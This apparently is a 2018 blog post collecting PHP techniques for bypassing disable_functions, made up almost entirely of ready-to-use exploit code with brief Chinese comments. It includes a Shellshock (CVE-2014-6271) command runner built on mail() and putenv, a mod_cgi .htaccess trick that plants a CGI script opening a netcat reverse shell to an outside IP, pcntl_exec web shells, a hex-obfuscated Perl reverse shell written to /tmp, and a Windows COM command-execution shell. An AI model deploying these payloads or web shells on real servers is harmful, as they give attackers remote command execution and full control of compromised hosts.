---
layout: post
title:  "PHP Disabled_function Bypass"
date:   2018-10-09 14:05:21 +0800
tags: PHP EXP
color: rgb(255,90,90)
cover: '../assets/test.png'
subtitle: 'PHP 禁用函数绕过'
---

**PHP 5.x Shellshock Exploit**

`Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)`

`# CVE: CVE-2014-6271`

```php
<pre>
<?php echo "Disabled functions: ".ini_get('disable_functions')."\n"; ?>
<?php
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
   if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
     $tmp = tempnam(".","data");
     putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
     // In Safe Mode, the user may only alter environment variables whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
     // PHP will let the user modify ANY environment variable!
     mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
   }
   else return "Not vuln (not bash)";
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != "") return $output;
   else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>`
```

mod_cgi

```php
<?php
// Only working with mod_cgi, writable dir and htaccess files enabled
$cmd = "nc -c '/bin/bash' 172.16.15.1 4444"; //command to be executed
$shellfile = "#!/bin/bash\n"; //using a shellscript
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n"; //header is needed, otherwise a 500 error is thrown when there is output
$shellfile .= "$cmd"; //executing $cmd
function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
	echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}
if (!isset($_GET['checked']))
{
	@file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
	header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
}
else
{
	$modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
	$writable = is_writable('.'); //current dir writable?
	$htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
		checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
		checkEnabled("Is writable",$writable,"Yes","No");
		checkEnabled("htaccess working",$htaccess,"Yes","No");
	if(!($modcgi && $writable && $htaccess))
	{
		echo "Error. All of the above must be true for the script to work!"; //abort if not
	}
	else
	{
		checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
		checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGI\nAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
		checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
		checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
		echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; //call the script
	}
}
?>
```

**pcntl_exec**

PHP 4 >= 4.2.0, PHP 5 on linux 

```php
#/tmp/hack.sh
#!/bin/bash
ls -l /

#exec.php
<?php pcntl_exec(“/bin/bash”, array(“/tmp/hack.sh”));?>
```

```php+HTML
<?php
$cmd = @$_REQUEST[cmd];
if(function_exists('pcntl_exec')) {
    $cmd = $cmd."&pkill -9 bash >out";
    pcntl_exec("/bin/bash", $cmd);
    echo file_get_contents("out");        
} else {
        echo '不支持pcntl扩展';
}
?>
```

```php
<?php 
/*******************************
 *查看phpinfo编译参数--enable-pcntl
 *作者 Spider
 *nc -vvlp 443
********************************/
 
$ip = 'xxx.xxx.xxx.xxx';
$port = '443';
$file = '/tmp/bc.pl';
 
header("content-Type: text/html; charset=gb2312");
 
if(function_exists('pcntl_exec')) {
        $data = "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x20\x2d\x77\x0d\x0a\x23\x0d\x0a".
                "\x0d\x0a\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74\x3b\x20\x20\x20\x20\x0d\x0a\x75\x73\x65\x20".
                "\x53\x6f\x63\x6b\x65\x74\x3b\x0d\x0a\x75\x73\x65\x20\x49\x4f\x3a\x3a\x48\x61\x6e\x64\x6c\x65".
                "\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x20\x3d\x20\x27".$ip.
                "\x27\x3b\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x20\x3d\x20\x27".$port.
                "\x27\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x70\x72\x6f\x74\x6f\x20\x3d\x20\x67\x65\x74\x70\x72".
                "\x6f\x74\x6f\x62\x79\x6e\x61\x6d\x65\x28\x22\x74\x63\x70\x22\x29\x3b\x0d\x0a\x6d\x79\x20\x24".
                "\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x20\x3d\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e".
                "\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x2c\x20\x69\x6e\x65\x74\x5f\x61\x74\x6f".
                "\x6e\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x29\x29\x3b\x0d\x0a\x6d\x79\x20\x24\x73\x68".
                "\x65\x6c\x6c\x20\x3d\x20\x27\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x27\x3b\x0d\x0a\x73\x6f".
                "\x63\x6b\x65\x74\x28\x53\x4f\x43\x4b\x2c\x20\x41\x46\x5f\x49\x4e\x45\x54\x2c\x20\x53\x4f\x43".
                "\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x20\x24\x70\x72\x6f\x74\x6f\x29\x3b\x0d\x0a\x53\x54\x44".
                "\x4f\x55\x54\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x53\x4f\x43".
                "\x4b\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x63\x6f\x6e\x6e\x65".
                "\x63\x74\x28\x53\x4f\x43\x4b\x2c\x24\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x29\x20\x6f\x72\x20".
                "\x64\x69\x65\x20\x22\x63\x61\x6e\x20\x6e\x6f\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x3a\x24\x21".
                "\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x49\x4e\x2c\x20\x22\x3c\x26\x53\x4f\x43\x4b".
                "\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x4f\x55\x54\x2c\x20\x22\x3e\x26\x53\x4f\x43".
                "\x4b\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x45\x52\x52\x2c\x20\x22\x3e\x26\x53\x4f".
                "\x43\x4b\x22\x3b\x0d\x0a\x73\x79\x73\x74\x65\x6d\x28\x24\x73\x68\x65\x6c\x6c\x29\x3b\x0d\x0a".
                "\x63\x6c\x6f\x73\x65\x20\x53\x4f\x43\x4b\x3b\x0d\x0a\x65\x78\x69\x74\x20\x30\x3b\x0a";
        $fp = fopen($file,'w');
        $key = fputs($fp,$data);
        fclose($fp);
        if(!$key) exit('写入'.$file.'失败');
        chmod($file,0777);
        pcntl_exec($file);
        unlink($file);
} else {
        echo '不支持pcntl扩展';
}
?>
```

**windows system components**

```php
<?php

$command=$_POST[a];

$wsh = new COM('WScript.shell');   // 生成一个COM对象

$exec = $wsh->exec('cmd.exe /c '.$command); //调用对象方法来执行命令

$stdout = $exec-&gt;StdOut();

$stroutput = $stdout->ReadAll();

echo $stroutput

?>
```

